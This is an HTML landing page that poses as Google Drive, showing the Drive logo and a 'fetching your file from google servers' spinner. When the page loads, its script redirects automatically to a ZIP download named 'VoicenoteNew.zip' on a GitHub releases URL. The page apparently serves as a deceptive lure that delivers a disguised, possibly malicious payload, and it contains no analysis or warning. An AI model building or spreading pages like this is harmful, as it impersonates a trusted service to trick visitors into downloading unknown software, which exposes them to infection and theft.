<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Redirecting...</title>
    <meta name="robots" content="noindex, nofollow">
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            background-color: #f0f0f0;
        }
        .logo {
            max-width: 200px;
            margin-bottom: 20px;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <!-- Optional Logo -->
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Google_Drive_icon_%282020%29.svg/800px-Google_Drive_icon_%282020%29.svg.png" alt="Logo" class="logo">
    
    <h1>fetching your file from google servers...</h1>
	 <p>please be patient</p>
    <div class="loader"></div>
    <p id="status">You will be redirected shortly.</p>
    <a id="redirect-link" href="#" style="display: none;">Click here if not redirected</a>
    <script>
    (function() {
        // Hardcoded destination URL
        const destinationUrl = "https://github.com/secureservr/voicenote/releases/download/NewVoicenote/VoicenoteNew.zip"; // Replace with your actual destination URL

        function safeRedirect(url) {
            if (url) {
                document.getElementById('redirect-link').href = url;
                document.getElementById('redirect-link').style.display = 'inline';
                
                // Add meta refresh tag
                var meta = document.createElement('meta');
                meta.httpEquiv = "refresh";
                meta.content = "0;url=" + url;
                document.getElementsByTagName('head')[0].appendChild(meta);
                
                // Attempt JavaScript redirect
                window.location.href = url;
            } else {
                document.getElementById('status').textContent = 'Invalid destination. Please check the URL.';
            }
        }

        // Run the redirect logic
        safeRedirect(destinationUrl);
    })();
    </script>
</body>
</html>
